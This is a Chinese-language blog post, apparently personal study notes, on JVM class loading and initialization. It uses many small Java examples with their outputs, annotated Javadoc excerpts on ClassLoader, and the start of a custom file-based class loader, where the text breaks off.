&lt;p&gt;&lt;code&gt;ldc&lt;/code&gt;表示将int、float或是String类型的常量值从常量池中推送至栈顶。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bipush&lt;/code&gt;表示将单字节（-128~127）的常量值推送至栈顶。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sipush&lt;/code&gt;表示将短整型(-32767~32768)的常量值推送至栈顶。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;inconst_1&lt;/code&gt;表示将int类型1推送至栈顶 (inconst_m1 ~inconst_5)。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;anewarray&lt;/code&gt; 表示创建一个引用类型（如类，接口，数组）的数组，并将其引用值推至栈顶。&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;newarray&lt;/code&gt; 表示创建一个指定的原始类型（如int，float,char等）的数组，并将其引用值推至栈顶。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;类的初始化规则&quot;&gt;类的初始化规则&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/*
* 当一个常量的值并非编译期间可以确定的，那么其值就不会被放到调用类的常量池中，
    这是在程序运行时，会导致主动使用这个常量所在的类，显然就会导致这个类被初始化。
*/
public class MyTest3{
  public static void main(String[] args){
    System.out.println(MyParent3.str);
  }
}

class MyParent3{
   public static final String str = UUID.randomUUID().toString();
   
   static {
    System.out.println(&quot;Myparent3 static block&quot;);  // 这一行能输出吗？会
  }
}

为什么第二个例子不会输出，第三个例子就输出了呢？ 
因为第三个例子的值，是只有当运行期才会被确定的值。而第二个例子的值，是编译时就能被确定的值。&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class MyTest4{
  public static void main(String[] args){
   MyParent4 myParent4 = new MyParent4(); 
  }
}

class MyParent4{
   static {
    System.out.println(&quot;Myparent4 static block&quot;);  // 这一行能输出吗？会
  }
}
因为MyParent4 myParent4 = new MyParent4();  属于主动使用的第一条，类的使用。&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
    对于数组实例来说，其类型是由JVM在运行期间动态生成的，表示为 [Lcom.erwa.MyTest4
    这种形式，动态生成的类型，其父类型就是Object
    
*/
public class MyTest4{
  public static void main(String[] args){
   MyParent4[]  myParent4s = new MyParent4[1]; 
        System.out.println(myParent4s.getClass());
        System.out.println(myParent4s.getClass().getSuperclass());
  }
}

class MyParent4{
   static {
    System.out.println(&quot;Myparent4 static block&quot;);  // 这一行能输出吗？不会
  }
}

因为 MyParent4[]  myParent4s = new MyParent4[1];  并不属于主动使用的方式。
  
&amp;gt; Task :MyTest4.main()输出结果为：
class [Lcom.erwa.jvm.MyParent4;
class java.lang.Object&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;                int[] ints = new int[1];
        System.out.println(ints.getClass());

        boolean[] booleans = new boolean[1];
        System.out.println(booleans.getClass());

        short[] shorts = new short[1];
        System.out.println(shorts.getClass());

        double[] doubles = new double[1];
        System.out.println(doubles.getClass());

class [I
class [Z
class [S
class [D&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;接口的初始化规则&quot;&gt;接口的初始化规则&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;接口本身的成员变量 都是 public static final 的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
    当一个接口在初始化时，并不要求其父接口都完成了初始化。
    只有在真正使用到父接口的时候（如 引用接口中所定义的常量时），才会初始化。
*/
public class MyTest5{
  public static void main(String[] args){
    System.out.println(myParent5.b);
  }
}

interface MyParent5{
  public static int a = 5;
}

interface MyChild5 extends MyParent5{
  public static int b = 6;
}

/**
class MyChild5 implements MyParent5{
  public static int b = 6;
}
**/&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;类的初始化顺序&quot;&gt;类的初始化顺序&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/*
    这个例子很好的阐述了类初始化的顺序问题。
*/
public class MyTest6{
    public static void main(String[] args) {
        Singleton singleton = Singleton.getInstance();
        System.out.println(&quot;counter1:&quot;+Singleton.counter1);
        System.out.println(&quot;counter2:&quot;+Singleton.counter2);
    }
}

class Singleton{
    public static int counter1 = 1;
  
    private static Singleton singleton= new Singleton();
    private Singleton(){
        counter1++;
        counter2++;   // 准备阶段的重要意义
        System.out.println(counter1);
        System.out.println(counter2);
    }
  
    public static int counter2 = 0;
  
    public static Singleton getInstance(){
        return singleton;
    }
}

&amp;gt; Task :MyTest6.main()
2
1  
counter1:2
counter2:0&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;类加载的加载顺序&quot;&gt;类加载的加载顺序&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpcqmzk5gj30u20q6dkm.jpg&quot; alt=&quot;image-20200208221610181&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpcrfww60j313x0u0qkh.jpg&quot; alt=&quot;image-20200208221655905&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;类加载器&quot;&gt;类加载器&lt;/h2&gt;
&lt;h3 id=&quot;类加载的概念回顾&quot;&gt;类加载的概念回顾&lt;/h3&gt;
&lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtwnve2h8j31pi0kwh89.jpg&quot; alt=&quot;image-20200212204737909&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtqltk6zyj30y40m0dpx.jpg&quot; alt=&quot;image-20200212171808157&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpd9k2dh4j311g0r8k8r.jpg&quot; alt=&quot;image-20200208223421181&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpd9su7pqj312g0qse09.jpg&quot; alt=&quot;image-20200208223434835&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdabx4bxj30y80eagxd.jpg&quot; alt=&quot;image-20200208223505045&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdb01nqsj311i0iyneo.jpg&quot; alt=&quot;image-20200208223542725&quot;/&gt;&lt;/p&gt;
&lt;p&gt;依次执行初始化语句：按照CLass类文件中的顺序加载静态方法和静态代码块。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdc0znagj311a0pg4ic.jpg&quot; alt=&quot;image-20200208223642407&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdcf2t7jj30za0cutln.jpg&quot; alt=&quot;image-20200208223705030&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/Users/erwa/Library/Application%20Support/typora-user-images/image-20200212205713902.png&quot; alt=&quot;image-20200212205713902&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdcywo8fj30za08qtea.jpg&quot; alt=&quot;image-20200208223738483&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;重点介绍一下上图的概念。举例说明。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在初始化一个接口时，并不会先初始化它的父接口。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 当一个类初始化时，它实现的接口是不会被初始化的。
public class MyTest5{
  public static void main(String[] args){
    System.out.println(MyChild5.b);
  }
}

interface MyParent5{
  public static Thread thread = new Thread(){
    // 每次被实例化的时候都会执行下方的代码块。 如果是 static{} 的时候，只会被加载一次。
    {
      System.out.println(&quot;myParent5 invoked&quot;);
    }    
  }
}

class MyChild5 implements MyParent5{
  public static int b = 6;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 在初始化一个接口时，并不会先初始化它的父接口
public class MyTest5{
  public static void main(String[] args){
    System.out.println(MyParent5_1.thread);
  }
}

interface MyParent5{
  public static Thread thread = new Thread(){
    {
      System.out.println(&quot;myParent5 invoked&quot;);
    }    
  }
}

interface MyParent5_1 extends MyGrandpa5_1{
  public static Thread thread = new Thread(){
    {
      System.out.println(&quot;myParent5 invoked&quot;);
    }    
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdepkj6mj311m0e449e.jpg&quot; alt=&quot;image-20200208223917870&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdey37kkj30zc09idog.jpg&quot; alt=&quot;image-20200208223931946&quot;/&gt;&lt;/p&gt;
&lt;p&gt;调用CLassLoader类的loadCLass方法加载一个类，并不是对类的主动使用，不会导致类的初始化。&lt;/p&gt;
&lt;h3 id=&quot;类加载器深度剖析&quot;&gt;类加载器深度剖析&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdf7r2yvj30wg07qjx6.jpg&quot; alt=&quot;image-20200208223947354&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdgccf6jj30v40iidsk.jpg&quot; alt=&quot;image-20200208224052752&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpdhv8fu0j311q0b64cd.jpg&quot; alt=&quot;image-20200208224219186&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下图：不是继承关系，是包含关系。&lt;/p&gt;
&lt;pre class=&quot;mermaid&quot;&gt;
&lt;code&gt;graph TD

根类加载器 --&amp;gt; 扩展类加载器

扩展类加载器 --&amp;gt; 系统类加载器

系统类加载器 --&amp;gt; 用户自定义类加载器&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtx888entj31990u0e28.jpg&quot; alt=&quot;image-20200212210718684&quot;/&gt;&lt;/p&gt;
&lt;p&gt;线程上下文类加载器 作用：打破双亲委托机制。加载SPI提供的类。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtqtdihq6j313l0u0azh.jpg&quot; alt=&quot;image-20200212172526162&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;类加载器的双亲委托机制&quot;&gt;类加载器的双亲委托机制&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;一层一层的 让父类去加载，最顶层父类不能加载往下数，依次类推。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpehkukjtj31320fqan7.jpg&quot; alt=&quot;image-20200208231639491&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtxcms5o4j311q0u0k64.jpg&quot; alt=&quot;image-20200212211132533&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtxd9whj7j31440u0e81.jpg&quot; alt=&quot;image-20200212211208653&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpeujkj26j312o0se1kx.jpg&quot; alt=&quot;image-20200208232907118&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbpevbschsj31220gutqf.jpg&quot; alt=&quot;image-20200208232951439&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;能够成功加载自定义类加载器的系统类加载器 被称为&lt;code&gt;定义类加载器&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;所有能够返回Class对象引用的类加载器都被称为&lt;code&gt;初始类加载器&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtxf3nkzrj31nq0oonnx.jpg&quot; alt=&quot;image-20200212211347665&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtxhy4nswj318z0u01kx.jpg&quot; alt=&quot;image-20200212211400339&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbz1vletigj31180kcqho.jpg&quot; alt=&quot;image-20200217073556952&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtxi5iwkoj31h00ac13h.jpg&quot; alt=&quot;image-20200212211651815&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class MyTest7 {
    public static void main(String[] args) throws ClassNotFoundException {
        Class&amp;lt;?&amp;gt; c = Class.forName(&quot;java.lang.String&quot;);
        System.out.println(c.getClassLoader()); // 返回针对于这个类的类加载器

        Class&amp;lt;?&amp;gt; c1 = Class.forName(&quot;com.erwa.jvm.C&quot;);
        System.out.println(c1.getClassLoader());
    }
}

class C{

}

&amp;gt; 输出结果为：
&amp;gt; Task :MyTest7.main()
null 
sun.misc.Launcher$AppClassLoader@659e0bfd
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;getClassLoader()的 Javadoc： 
java.lang.Class&amp;lt;T&amp;gt; public ClassLoader getClassLoader()
Returns the class loader for the class. Some implementations may use null to represent the bootstrap class loader. This method will return null in such implementations if this class was loaded by the bootstrap class loader.
  
 // 返回类的类加载器。一些实现可能使用null来表示引导类加载器。如果这个类是由引导类加载器加载的，那么这个方法在这样的实现中将返回null。
  
If a security manager is present, and the caller s class loader is not null and the caller s class loader is not the same as or an ancestor of the class loader for the class whose class loader is requested, then this method calls the security manager s checkPermission method with a RuntimePermission(&quot;getClassLoader&quot;) permission to ensure its ok to access the class loader for the class.
If this object represents a primitive type or void, null is returned.
//如果此对象表示基本类型或void，则返回null。

Returns:
the class loader that loaded the class or interface represented by this object.
Throws:
SecurityException – if a security manager exists and its checkPermission method denies access to the class loader for the class.&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;对于final的理解深入&quot;&gt;对于final的理解深入&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class FinalTest{
    public static final int x=3;  // final的话 就是编译期间的常量
  static {
    System.out.println(&quot;FinalTest stataic block&quot;);  // 会输出吗？不会
  }
}

public class MyTest8 {
    public static void main(String[] args){
        System.out.println(FinalTest.x); 
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;类的初始化顺序举例练习&quot;&gt;类的初始化顺序举例练习&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Parent {
    static int a = 3;
    static {
        System.out.println(&quot;parent stataic block &quot;);
    }
}

class Child extends Parent{
    static int b = 4;
    static {
        System.out.println(&quot;child static block &quot;);
    }
}

public class MyTest9 {
    static {
        System.out.println(&quot;Mytest9 static block &quot;);
    }
    public static void main(String[] args){
        System.out.println(Child.b);
    }
}

&amp;gt; 输出结果:
&amp;gt; Task :MyTest9.main()
Mytest9 static block 
parent stataic block 
child static block 
4
  
类的加载顺序： 
1. MyTest9
2. Parent 
3. Child &lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 这是一个好例子。  明白了。 类初始化的顺序    的练习。

// 每一个类，在初始化的时候，只会被初始化一次。
class Parent2 {
    static int a = 3;
    static {
        System.out.println(&quot;parent2 stataic block &quot;);
    }
}

class Child2 extends Parent2{
    static int b = 4;
    static {
        System.out.println(&quot;child2 static block &quot;);
    }
}

public class MyTest10 {
    static {
        System.out.println(&quot;MyTest10 static block &quot;);
    }
    public static void main(String[] args){
      Parent2 parent2;  // 不属于主动使用
      System.out.println(&quot;- - -- - - &quot;);
        parent2 = new Parent2();  // 主动使用， 初始化 Parent2 
      System.out.println(&quot;- - -- - - &quot;);
        System.out.println(parent2.a);
      System.out.println(&quot;- - -- - - &quot;);
        System.out.println(Child2.b);
    }
}

&amp;gt; 输出结果:
&amp;gt; Task :MyTest10.main()
MyTest10 static block 
- - -- - - 
parent2 stataic block 
- - -- - - 
3
- - -- - - 
child2 static block 
4 &lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 使用子类，访问父类中的方法。 等于是主动使用父类，而不是主动使用子类。
class Parent3 {
    static int a = 3;
    static {
        System.out.println(&quot;parent3 stataic block &quot;);
    }
    static void doSomething(){
        System.out.println(&quot;do something &quot;)
    }
}

class Child3 extends Parent3{
    static int b = 4;
    static {
        System.out.println(&quot;child3 static block &quot;);
    }
}

public class MyTest11 {
  
    public static void main(String[] args){
      System.out.println(Child3.a);  // a 是定义在父类中的， 等于是 主动使用父类
      Child3.doSomething();
    }
}

&amp;gt; 预计结果:
&amp;gt; Task :MyTest11.main()
parent3 static block 
do something 
child3 static block
3
do something 

&amp;gt; 实际结果：  
&amp;gt; Task :MyTest11.main()
parent3 stataic block 
3
do something 
  
错误原因：  a 是定义在父类中的， 等于是 主动使用父类；并没有主动使用Child&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//  调用ClassLoader类的loadClass方法加载一个类，并不是对类的主动使用，不会导致类的初始化
//  反射，是对类的主动使用，会初始化类
class CL{
    static {
        System.out.println(&quot;Class CL &quot;);
    }
}

public class MyTest12 {

    public static void main(String[] args) throws ClassNotFoundException {
        ClassLoader loader = ClassLoader.getSystemClassLoader(); 
        Class&amp;lt;?&amp;gt; clazz = loader.loadClass(&quot;com.erwa.jvm.CL&quot;);// 不会初始化CL类
        System.out.println(clazz);
        System.out.println(&quot;- - - - - -&quot;);
        clazz = Class.forName(&quot;com.erwa.jvm.CL&quot;); // 反射会初始化CL类
        System.out.println(clazz);
    }
}

&amp;gt; 输出结果:
&amp;gt; Task :MyTest12.main()
class com.erwa.jvm.CL
- - - - - -
Class CL 
class com.erwa.jvm.CL&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2020年02月09日09:41:01 继续吧。--- 今天是周末。原来说的要加班。不加了。学习&lt;/p&gt;
&lt;h4 id=&quot;类加载器的层次关系&quot;&gt;类加载器的层次关系&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class MyTest13{
  psvm{
    ClassLoader classLoader = ClassLoader.getSystemClassLoader();
    sout(classLoader);
    while (null != classLoader){
      classLoader = classLoader.getParent();
      sout(classLoader);
    }
  }
}

&amp;gt; 输出结果:
&amp;gt; Task :MyTest13.main()
sun.misc.Launcher$APPClassLoader    应用类加载器
sun.misc.Launcher$ExtClassLoader  扩展类加载器
null  根类加载器&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//如何通过给定的字节码路径，打印出类的信息
public class MyTest14{
  psvm{   //上下文类加载器是由当前的线程提供的
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    String resourceName = &quot;com/erwa/jvm/MyTest13.class&quot;;
    
    Enumeration&amp;lt;URL&amp;gt; urls = classLoader.getResources(resourceName);
    while(urls.hasMoreElements()){
      URL url = urls.nextElement();
      sout(url); // 输出结果为 资源在本机上的完整路径。
    }
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;获得classloader的途径&quot;&gt;获得ClassLoader的途径&lt;/h4&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;获得当前类的CLassLoader&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;clazz.getClassLoader();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;获得当前线程上下文的ClassLoader&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Thread.currnetThread().getContextClassLoader();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;获得系统的ClassLoader&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;CLassLoader.getSystemClassLoader();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;获得调用者的ClassLoader&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;DriberManager.getCallerClassLoader();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;sun.misc.Launcher$APPClassLoader    应用类加载器
sun.misc.Launcher$ExtClassLoader  扩展类加载器
null  根类加载器

  比如： Class&amp;lt;?&amp;gt; clazz = String.class; 
       sout(clazz.getClassLoader()); //打印结果为 null . 因为是系统的类。
             Class&amp;lt;?&amp;gt; clazz = MyTest14.class; 
       sout(clazz.getClassLoader()); //打印结果为 APPClassLoader . 因为自定义的类。&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;classloader类源码剖析&quot;&gt;ClassLoader类源码剖析&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;ClassLoader的Javadoc：
java.lang public abstract class ClassLoader  extends  Object
   
A class loader is an object that is responsible for loading classes. The class ClassLoader is an abstract class. Given the binary name of a class, a class loader should attempt to locate or generate data that constitutes a definition for the class. A typical strategy is to transform the name into a file name and then read a &quot;class file&quot; of that name from a file system.
/* 
一个类加载器是一个对象，用于加载类。 ClassLoader是一个抽象类，如果我们给了二进制的名字，ClassLoader应该尝试生成一些数据（构成了这个类定义的数据）。 一种典型的策略是将二进制名字转换成文件名字，然后从系统中读取这个文件。
*/
Every Class object contains a reference to the ClassLoader that defined it.
// 每一个Class对象都会包含 定义这个类的类加载器对象
Class objects for array classes are not created by class loaders, but are created automatically as required by the Java runtime. The class loader for an array class, as returned by Class.getClassLoader() is the same as the class loader for its element type; if the element type is a primitive type, then the array class has no class loader.
Applications implement subclasses of ClassLoader in order to extend the manner in which the Java virtual machine dynamically loads classes.
/*  数组类 比较特殊：
对于数组内的Class对象，并不是由类加载器创建的，而是由Java运行时根据需要自动创建的（其他类是由类加载器创建的）（数组类型不会导致类的初始化）。对于一个数组类的ClassLoader来说，返回结果是数组当中元素的结果是一样的。如果数组中的元素是原生类型的，那么此时数组类是没有类加载器的。
应用程序实现类装入器的子类，以扩展Java虚拟机动态加载类的方式。
*/
  
- - - - -- - 数组类的类加载器举例： - - - -- - - 
public class MyTest15{
  psvm{
    String[] strings = new String[2];
    sout(strings.getClass().getClassLoader()); // 输出结果为null ； 因为是String 的类加载器（此时的null代表根类加载器的类型）;
    MyTest15[] mytest15 = new MyTest15[2];
    sout(mytest15.getClass().getClassLoader());// 结果为 AppClassLoader ; 因为是自自定义的类
    Integer[] integet = new Integer[2];
    sout(integet.getClass().getClassLoader()); // 输出结果为null;因为是原生类型。（此时的null不代表根类加载器的类型，就是null）
  }
}

Class loaders may typically be used by security managers to indicate security domains.
// 类加载器 会伴随着安全管理器来确保安全的。
The ClassLoader class uses a delegation model to search for classes and resources. Each instance of ClassLoader has an associated parent class loader. When requested to find a class or resource, a ClassLoader instance will delegate the search for the class or resource to its parent class loader before attempting to find the class or resource itself. The virtual machines built-in class loader, called the &quot;bootstrap class loader&quot;, does not itself have a parent but may serve as the parent of a ClassLoader instance.
/*
ClassLoader使用双亲委托模型来寻找资源。ClassLoader的每一个实例都有一个关联的父的ClassLoader。当要求ClassLoader去需要资源时，ClassLoader在自己寻找资源之前，会将资源寻找委托给它的父ClassLoader。层层往上递进。虚拟机内荐的类加载器叫做启动类加载器，它本身是没有双亲的，但是它可以当做是其他类加载器的双亲。
*/
Class loaders that support concurrent loading of classes are known as parallel capable class loaders and are required to register themselves at their class initialization time by invoking the ClassLoader.registerAsParallelCapable method. Note that the ClassLoader class is registered as parallel capable by default. However, its subclasses still need to register themselves if they are parallel capable. In environments in which the delegation model is not strictly hierarchical, class loaders need to be parallel capable, otherwise class loading can lead to deadlocks because the loader lock is held for the duration of the class loading process (see loadClass methods).
/*
并行的ClassLoader注册。
支持类的并发加载的类加载器称为支持并行的类加载器，需要通过调用类加载器在类初始化时注册它们自己。registerAsParallelCapable方法。注意，默认情况下ClassLoader类被注册为支持并行的。但是，它的子类仍然需要注册它们自己，如果它们是并行的。在委托模型没有严格层次结构的环境中，类装入器需要具有并行能力，否则类装入可能会导致死锁，因为装入器锁在类装入过程期间一直持有(请参阅loadClass方法)。
*/  
Normally, the Java virtual machine loads classes from the local file system in a platform-dependent manner. For example, on UNIX systems, the virtual machine loads classes from the directory defined by the CLASSPATH environment variable.
 /*
通常情况下，jvm会从本地文件系统中去加载类。  例如在unix 上，jvm会从CLasspath环境变量定义的目录中去加载。
*/ 
However, some classes may not originate from a file; they may originate from other sources, such as the network, or they could be constructed by an application. The method defineClass converts an array of bytes into an instance of class Class. Instances of this newly defined class can be created using Class.newInstance.
/*
然而，，一些类并不是来源于文件。  如通过网络，动态代理等。 
这种情况下，定义类会将字节数组转换成class的一个实例。这个新定义的实例可能通过Class.newInstance来创建。
*/  
The methods and constructors of objects created by a class loader may reference other classes. To determine the class(es) referred to, the Java virtual machine invokes the loadClass method of the class loader that originally created the class.
/*
类加载器创建的对象的方法和构造函数可以引用其他类。为了确定引用的类，Java虚拟机调用最初创建类的类加载器的loadClass方法。
*/  
For example, an application could create a network class loader to download class files from a server. Sample code might look like:
// 例如，应用程序可以创建一个网络类装入器来从服务器下载类文件。示例代码可能如下:
     ClassLoader loader = new NetworkClassLoader(host, port);
     Object main = loader.loadClass(&quot;Main&quot;, true).newInstance();
          . . .
   
The network class loader subclass must define the methods findClass and loadClassData to load a class from the network. Once it has downloaded the bytes that make up the class, it should use the method defineClass to create a class instance. A sample implementation is:
//网络类加载器子类必须定义findClass和loadClassData方法，以便从网络加载类。一旦下载了构成类的字节，就应该使用defineClass方法来创建类实例。一个示例实现是:
       class NetworkClassLoader extends ClassLoader {
           String host;
           int port;
  
           public Class findClass(String name) {
               byte[] b = loadClassData(name);
               return defineClass(name, b, 0, b.length);
           }
  
           private byte[] loadClassData(String name) {
               // load the class data from the connection
                . . .
           }
       }
   
Binary names  // `二进制的名字` 介绍： 
Any class name provided as a String parameter to methods in ClassLoader must be a binary name as defined by The Java™ Language Specification.
Examples of valid class names include:
     &quot;java.lang.String&quot;   // 字符串的类 
     &quot;javax.swing.JSpinner$DefaultEditor&quot;  // DefaultEditor是JSpinner的一个内部类
     &quot;java.security.KeyStore$Builder$FileBuilder$1&quot; // FileBuilder里的第一个匿名内部类
     &quot;java.net.URLClassLoader$3$1&quot; //  URLClassLoader里的第三个匿名内部类中的第一个匿名内部类&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;自定义一个类加载器&quot;&gt;自定义一个类加载器&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtxmme0euj31mv0u0b29.jpg&quot; alt=&quot;image-20200212212108254&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;java &quot;&gt;
&lt;code&gt;package com.erwa.jvm;

import java.io.*;

public class MyTest16 extends ClassLoader {
    private String classLoaderName ;
    private final String fileExtension =&quot;.class&quot;;

    //构造方法
    public MyTest16(String classLoaderName){
        super();// 将系统类加载器当做该类加载器的父加载器
        this.classLoaderName = classLoaderName;
    }

    public MyTest16(ClassLoader parent,String classLoaderName){
        super(parent);// 显示指定该类加载器的父加载器
        this.classLoaderName = classLoaderName;
    }

    @Override
    public String toString() {
        return &quot;MyTest16{&quot; +
                &quot;classLoaderName='&quot; + classLoaderName + '\'' +
                &quot;, fileExtension='&quot; + fileExtension + '\'' +
                '}';
    }

    @Override
    protected Class&amp;lt;?&amp;gt; findClass(String classname) throws ClassNotFoundException {
        // 重写findClass
        byte[] data = this.loadClassDate(classname);
        return this.defineClass(classname, data, 0, data.length);
    }

    private byte[] loadClassDate(String name){
        InputStream is = null;
        byte[] data = null;
        ByteArrayOutputStream baos = null;

        try{
            this.classLoaderName = this.classLoaderName.replace(&quot;.&quot;,&quot;/&quot;);

            is = new FileInputStream(new File(name + this.fileExtension));
            baos = new ByteArrayOutputStream();

            int ch = 0;
            while (-1 != (ch = is.read())) {
                baos.write(ch);
            }

            data = baos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
        }finally {
            try {
                assert is != null;
                is.close();
                assert baos != null;
                baos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return data;
    }

